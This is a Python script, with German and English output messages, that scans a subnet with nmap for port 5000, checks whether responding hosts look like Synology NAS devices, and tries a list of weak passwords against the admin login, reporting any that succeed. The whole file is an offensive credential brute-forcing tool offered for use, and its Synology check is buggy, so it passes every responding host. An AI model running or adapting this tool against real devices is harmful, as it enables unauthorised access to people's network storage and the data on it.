#!/usr/bin/python3
import subprocess
import argparse
import re
import requests
from bs4 import BeautifulSoup
import mechanicalsoup

ip_list_validated = []
port_list=['5000']
pwd_list=['admin','1234','123456',]

def scan(subnet):
    print ("Scannining "+str(subnet)+" on port "+str(port_list))
    nmap = subprocess.check_output(['nmap', subnet, '-p', '5000', '--open'])
    ip_list = re.findall( r'[0-9]+(?:\.[0-9]+){3}', nmap.decode('ascii'))
    return ip_list


def force(nas_list):
    for ip in nas_list:
        for port in port_list:
            print("Versuche IP "+ip)
            for pwd in pwd_list:
                browser = mechanicalsoup.StatefulBrowser()
                try:
                    browser.open("http://"+ip+":"+port)
                    browser.get_current_page()
                    browser.select_form()
                    browser["username"]="admin"
                    browser["passwd"]=pwd
                    response = browser.submit_selected()
                except (mechanicalsoup.utils.LinkNotFoundError, requests.exceptions.SSLError, requests.packages.urllib3.exceptions.ProtocolError) as e:
                    continue

                if '"success" : true' in str(response.text):
                    print ("Passwort '"+pwd+"' klappt fuer IP "+ip)
    return


def validate(ip_list):
    for ip in ip_list:
        for port in port_list:
            try:
                r = requests.get('http://'+ip+':'+port, timeout=2)
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.ConnectionError:
                continue
            doc = BeautifulSoup(r.text, "html.parser")
            meta=doc.find_all("meta")

        if "Synology" or "syno" in str(meta):
            ip_list_validated.append(ip)
    return ip_list_validated


parser = argparse.ArgumentParser()
parser.add_argument("-scan", help="Scan Provided Subnet for port in Portlist", action="store")
parser.add_argument("-validate",help="Validate if the provided IP address belongs to an Synology NAS", action="store")
parser.add_argument("-force",help="Force Passwords for user admin", action="store")
args = parser.parse_args()

if args.scan:

    ip_list = scan(args.scan)
    if not ip_list:
        print ("Don't founnd open Ports "+str(port_list)+" for Scanned IPs ("+args.scan+")")    
    else:
       print ("IPs "+str(ip_list)+" have open Ports on"+str(port_list))

if args.validate:
    if args.scan:
        validate(ip_list)
    else:
        ip_list=[args.validate]
        validate(ip_list)
    for i in ip_list_validated:
        print(i)

if args.force:
    if args.scan:
        force(ip_list_validated)
    else:
        ip_list_validated=validate([args.force])
        force(ip_list_validated)
